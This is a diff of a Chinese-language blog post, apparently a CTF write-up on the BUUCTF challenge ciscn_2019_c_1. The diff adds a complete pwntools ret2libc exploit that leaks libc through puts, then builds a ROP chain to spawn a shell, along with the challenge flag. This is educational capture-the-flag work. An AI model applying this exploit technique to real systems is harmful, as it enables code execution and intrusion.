@@ -102,8 +102,10 @@
 <meta property="og:description" content="buu上的第七道题,有栈溢出漏洞,但没有后门函数,查了下是ret2libc">
 <meta property="og:locale">
 <meta property="og:image" content="https://hzlg.github.ioz/2022/01/16/%E6%AF%8F%E6%97%A5%E5%8D%9A%E5%AE%A2/1.16-ret2libc/image-20220116141735529.png">
+<meta property="og:image" content="https://hzlg.github.ioz/2022/01/16/%E6%AF%8F%E6%97%A5%E5%8D%9A%E5%AE%A2/1.16-ret2libc/image-20220120230233493.png">
+<meta property="og:image" content="https://hzlg.github.ioz/2022/01/16/%E6%AF%8F%E6%97%A5%E5%8D%9A%E5%AE%A2/1.16-ret2libc/image-20220121124322612.png">
 <meta property="article:published_time" content="2022-01-16T06:41:58.300Z">
-<meta property="article:modified_time" content="2022-01-17T03:14:07.335Z">
+<meta property="article:modified_time" content="2022-01-21T05:13:40.125Z">
 <meta property="article:author" content="hzlg">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
@@ -336,7 +338,7 @@
 <span id="more"></span>
 
 <h2 id="0x1-：使用前提条件"><a href="#0x1-：使用前提条件" class="headerlink" title="0x1 ：使用前提条件"></a>0x1 ：使用前提条件</h2><p>存在溢出条件，题目没有system等后门函数，并且开启了NX保护</p>
-<p>NX即No-eXecute（不可执行）的意思，NX（DEP）栈不可执行保护的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。这样就会导致你直接构造的shellcode没有用。</p>
+<p>NX即No-eXecute（不可执行）的意思，NX（DEP）栈不可执行保护的基本原理是将数据所在内存页标识为不可执行，尝试ret2shellcode当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。这样就会导致你直接构造的shellcode没有用。</p>
 <h2 id="0x2-：解题思路"><a href="#0x2-：解题思路" class="headerlink" title="0x2 ：解题思路"></a>0x2 ：解题思路</h2><p>偏移地址：这就是与libc有关的原因，libc是Linux系统下的c函数库，既然是函数库就会存在system函数，binsh参数，<strong>libc里面存放的是函数的偏移地址</strong>。</p>
 <p>但是libc.so版本有很多，版本不同偏移量就不同，只要确定了libc版本就能确定偏移地址。</p>
 <p>基地址：基地址在同一次运行时是相同的，但第二次运行就不同了，所以造成了函数的真正地址一直在变，但即使一直在变，<strong>最后三位却一直相同</strong>。</p>
@@ -359,27 +361,21 @@
 <hr>
 <p>搜寻程序也没有可用的后门函数，需要自己<strong>泄露libc版本并构建ROP链</strong>。</p>
 <p>程序没有可用的后门函数，但有puts这个函数，就可以通过构造rop泄露出libc的版本和函数地址，利用LibcSearcher或者DynELF可以查到libc的版本，之后获取libc里面的地址构造ROP链，获取shell。</p>
-<p>1.先调用puts 泄露puts函数的地址，然后得到libc的基址</p>
 <p>我们首先要获得libc的基地址，可以通过puts函数入手，这里解释一下为什么通过puts函数而不通过其他函数，因为puts函数在我们进入encrypt函数之前已经调用了很多次了，对于每一个动态链接而言，<strong>第一次调用完成以后，就修正了.got表中的对应的puts函数的地址</strong>，所以我们可以通过puts函数泄露。</p>
-<p>1.先调用puts 泄露puts函数的地址，然后得到libc的基址</p>
-<p>2.利用one_gadget工具得到execve的libc地址，再加上libc基址得到execve(“/bin/sh“， rsp+0x50, environ)的地址</p>
-<p>3.再次进行溢出用execve的地址覆盖ret的地址从而获得shell</p>
-<p>由于两次的payload长度是一样的，加密函数里面的x经过第一个payload之后，值已经改变，x非当前函数栈变量, 不会再变了, 第二次payload输入是不会被加密的，可直接使用。</p>
-<hr>
-<p>教程 : </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./ciscn_2019_c_1 --only &#x27;pop|ret&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/16/%E6%AF%8F%E6%97%A5%E5%8D%9A%E5%AE%A2/1.16-ret2libc/image-20220120230233493.png" alt="image-20220120230233493"> </p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p><img src="/2022/01/16/%E6%AF%8F%E6%97%A5%E5%8D%9A%E5%AE%A2/1.16-ret2libc/image-20220121124322612.png" alt="image-20220121124322612"> </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = remote(&#x27;node4.buuoj.cn&#x27;, 25077)  </span></span><br><span class="line">sh = process(<span class="string">&quot;./ciscn_2019_c_1&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">gdb.attach(sh,<span class="string">&quot;b *0x400bcd\nc\nsi&quot;</span>)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_plt&quot;</span>,<span class="built_in">hex</span>(puts_plt))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_got&quot;</span>,<span class="built_in">hex</span>(puts_got))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;main_addr&quot;</span>,<span class="built_in">hex</span>(main_addr))</span><br><span class="line"><span class="comment"># 下面的两个通过ROPgadget得到</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x400c83</span> <span class="comment">#一个万能的gadget，x64程序基本都存在，pop rdi;ret;</span></span><br><span class="line">ret_addr = <span class="number">0x4006b9</span> <span class="comment"># init+25, 一个ret</span></span><br><span class="line"><span class="comment">#payload = b&#x27;a&#x27;*88+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)#也可以不加\n,加密后再发送</span></span><br><span class="line"><span class="comment">#p.sendline(encrypt(payload))</span></span><br><span class="line">payload_1 = <span class="string">b&#x27;\0&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">88</span>-<span class="number">1</span>) + p64(pop_rdi_addr)+ p64(puts_got)+ p64(puts_plt)+ p64(main_addr) <span class="comment"># 前面加\n绕过strlen</span></span><br><span class="line"><span class="comment"># vulnerable函数执行完返回地址被覆盖为pop_rdi_addr,将栈顶的puts_got弹入rdi作为参数,ret以栈顶的puts_plt为返回地址跳转,执行完puts后ret以栈顶的main_addr为返回地址跳转</span></span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload_1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">puts_got_addr = u64(sh.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_got_addr&quot;</span>,<span class="built_in">hex</span>(puts_got_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc=LibcSearcher(&#x27;__libc_start_main&#x27;, __libc_start_main_address)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">libc=LibcSearcher(&#x27;puts&#x27;, puts_got_addr)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">libc_base = puts_got_addr - libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">bin_sh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sys_addr = libc_base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line">libc_base = puts_got_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload_2 = <span class="string">b&#x27;\0&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">88</span>-<span class="number">1</span>)  + p64(ret_addr) +p64(pop_rdi_addr)+ p64(bin_sh_addr) + p64(sys_addr)</span><br><span class="line"><span class="comment"># vulnerable函数执行完返回地址被覆盖为ret_addr,以栈顶的pop_rdi_addr为返回地址跳转,将栈顶的bin_sh_addr弹入rdi作为参数,ret以栈顶的sys_addr为返回地址跳转,执行system(/bin/sh)</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;choice!\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;encrypted\n&#x27;</span>)</span><br><span class="line">sh.sendline(payload_2)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 <blockquote>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51032807/article/details/114808339?spm=1001.2014.3001.5501">(1条消息) PWN题型之Ret2Libc_swedsn-CSDN博客</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/5525dde00053">pwn学习之ret2libc3——偏移计算初体验 - 简书 (jianshu.com)</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85831">【技术分享】现代栈溢出利用技术基础：ROP - 安全客，安全资讯平台 (anquanke.com)</a></p>
+<p>flag{f881d004-2a40-449c-b880-fb1ae75acfb4}</p>
 </blockquote>
-<p>没看懂的解法 : </p>
+<hr>
+<p>查资料遇见的，没看完的 : </p>
 <blockquote>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43189757/article/details/100572092?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.pc_relevant_default&utm_relevant_index=3">(5条消息) BUUCTF ciscn_2019_c_1 write up_苍崎青子的博客-CSDN博客</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45913417/article/details/121408985">(5条消息) ciscn_2019_c_1_半步行止的博客-CSDN博客</a></p>
-<p><a target="_blank" rel="noopener" href="https://moddemod.blog.csdn.net/article/details/106477678?spm=1001.2101.3001.6650.8&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-8.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-8.pc_relevant_default&utm_relevant_index=9">(5条消息) BUUCTF ciscn_2019_c_1_、moddemod-CSDN博客</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/bing_Max/article/details/120429210?spm=1001.2101.3001.6650.9&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-9.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-9.pc_relevant_default&utm_relevant_index=10">(5条消息) CTF buuoj pwn—–第7题:ciscn_2019_c_1_bing_Max的博客-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85831">【技术分享】现代栈溢出利用技术基础：ROP - 安全客，安全资讯平台 (anquanke.com)</a></p>
 <p><a target="_blank" rel="noopener" href="https://oneda1sy.gitee.io/2020/02/24/stack-balance/">栈平衡和栈转移(Stack-Pivot) | 偏有宸机 (gitee.io)</a> </p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qinying001/article/details/103266763">(5条消息) BUUCTF ciscn_2019_c_1(rop_x64,泄露libc)_菜的只能随便写写博客-CSDN博客</a> </p>
 </blockquote>
 
       
@@ -420,6 +416,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2022/01/17/%E6%AF%8F%E6%97%A5%E5%8D%9A%E5%AE%A2/1.17-%EF%BC%81%EF%BC%81re-angr/" rel="prev" title="1.17-vmre">
+                1.17-vmre <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -496,7 +496,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">50</span>
+                <span class="site-state-item-count">58</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -509,7 +509,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">14</span>
+                <span class="site-state-item-count">15</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -544,7 +544,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x1-%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.</span> <span class="nav-text">0x1 ：使用前提条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x2-%EF%BC%9A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-number">2.</span> <span class="nav-text">0x2 ：解题思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-c-1"><span class="nav-number">3.</span> <span class="nav-text">ciscn_2019_c_1</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x1-%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.</span> <span class="nav-text">0x1 ：使用前提条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x2-%EF%BC%9A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-number">2.</span> <span class="nav-text">0x2 ：解题思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-c-1"><span class="nav-number">3.</span> <span class="nav-text">ciscn_2019_c_1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">4.</span> <span class="nav-text">exp</span></a></li></ol></div>
             
 
           </div>
